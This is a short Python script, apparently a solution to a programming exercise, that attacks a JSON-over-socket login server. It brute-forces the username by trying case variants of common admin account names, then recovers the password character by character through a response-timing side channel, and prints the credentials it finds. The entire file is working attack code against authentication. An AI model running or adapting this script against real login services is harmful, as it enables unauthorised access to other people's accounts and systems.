import socket
import sys
from itertools import product
import string
import json
from datetime import datetime


def connect_the_socket(ip, port):
    client_socket = socket.socket()
    address = (str(ip), int(port))
    client_socket.connect(address)
    return client_socket


def find_login(client_socket):
    logins = ['admin', 'Admin', 'admin1', 'admin2', 'admin3', 'user1', 'user2', 'root', 'default', 'new_user', 'some_user', 'new_admin', 'administrator', 'Administrator', 'superuser', 'super', 'su', 'alex', 'suser', 'rootuser', 'adminadmin', 'useruser', 'superadmin', 'username', 'username1']

    for login in logins:

        for i in product(*zip(login.upper(), login.lower())):
            log = {
                'login': ''.join(i),
                'password': ''
            }
            login_json = json.dumps(log)
            data = login_json.encode()
            if client_socket is None:
                response = json.dumps({'result': 'Wrong login!'})
            else:
                client_socket.send(data)
                response = client_socket.recv(1024)
                response = response.decode()
            response = json.loads(response)

            if response['result'] == 'Wrong login!':
                continue
            else:
                return log

    return None


def find_password(client_socket, login_dict):
    digits = string.digits
    letters = string.ascii_lowercase
    letters_upper = string.ascii_uppercase
    digit_lett = digits + letters + letters_upper
    digit_lett = list(digit_lett)
    response = {'result': ''}
    known_prefix = ''

    password_found = False

    while not password_found:
        letter_found = False
        for i in digit_lett:
            chars = known_prefix + i
            login_dict['password'] = chars
            data = json.dumps(login_dict).encode()
            start = datetime.now()
            sent_bytes = client_socket.send(data)
            response = client_socket.recv(4096)
            end = datetime.now()
            response = json.loads(response.decode())
            t = end - start
         
            if response['result'] == 'Connection success!':
                print(json.dumps(login_dict))
                password_found = True
                break
            elif t.microseconds > 70000:
               
                known_prefix = chars
                letter_found = True
                break
        if not letter_found:
            break




############################################################

try:
    ip = sys.argv[1]
    port = sys.argv[2]
except:
    ip = 'localhost'
    port = 9090

try:
    socket = connect_the_socket(ip, port)
except:
    socket = None

login = find_login(socket)
find_password(socket, login)

if socket:
    socket.close()
